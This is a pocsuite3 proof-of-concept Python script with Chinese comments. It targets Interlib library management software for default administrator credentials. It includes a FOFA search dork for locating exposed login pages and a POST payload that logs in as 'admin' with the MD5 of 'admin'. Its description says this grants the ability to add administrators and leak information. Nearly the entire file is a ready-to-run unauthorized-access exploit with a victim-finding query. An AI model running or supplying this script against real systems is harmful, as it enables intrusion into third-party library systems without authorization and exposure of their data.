#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2021/7/2 15:24
# @Author  : ox400
# @Email   : ox01024@163.com
# @File    : default_password_poc.py


from pocsuite3.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class DemoPOC(POCBase):
    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = '0x400'  # PoC作者的大名
    vulDate = 'NULL'  # 漏洞公开的时间,不知道就写今天
    createDate = '2021/7/2'  # 编写 PoC 的日期
    updateDate = '2021/7/2'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://xxx.xx.com.cn']  # 漏洞地址来源,0day不用写
    name = 'Interlib默认口令'  # PoC 名称
    fofaDorK = 'body="广州图创计算机软件开发有限公司 Copyright. 2003 All Rights Reserved 。" && title="系统登陆"'
    appPowerLink = '广州图创计算机软件开发有限公司'  # 漏洞厂商主页地址
    appName = 'Interlib'  # 漏洞应用名称
    appVersion = '2.0.1'  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = '''
            Interlib默认口令，未修改加强。
            可以添加管理员、造成信息泄露。
        '''  # 漏洞简要描述
    pocDesc = '''
            poc的用法描述
        '''  # POC用法描述

    def _check(self, url):
        headers = {'Content-Length': '104',
                   'Cache-Control': 'max-age=0',
                   'Upgrade-Insecure-Requests': '1',
                   'Origin': str(url[:-1]),
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                   'Referer': url + 'interlib/common/',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'zh-CN,zh;q=0.9',
                   'Cookie': 'JSESSIONID=1A7B09213AAB304FF1741CBBFE2EE6A1',
                   'Connection': 'close'}
        payload = r'cmdACT=opLOGIN&furl=maxMain.jsp&askm=21232f297a57a5a743894a0e4a801fc3&ps=&loginid=admin&sw=*************'
        response = requests.post(url=url, data=payload, headers=headers)
        print(response.text)
        if 'self.location.href="../interlib/common/";' in response.text:
            return url, 'admin', 'admin'
        return False

    def _verify(self):
        # 验证代码
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['user'] = p[1]
            result['VerifyInfo']['password'] = p[2]
        return self.parse_output(result)

    def _attack(self):
        self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            # 输出调用成功信息
            output.success(result)
        else:
            # 输出调用失败
            output.fail('target is not vulnerable')
        return output


# 注册 DemoPOC 类
register_poc(DemoPOC)
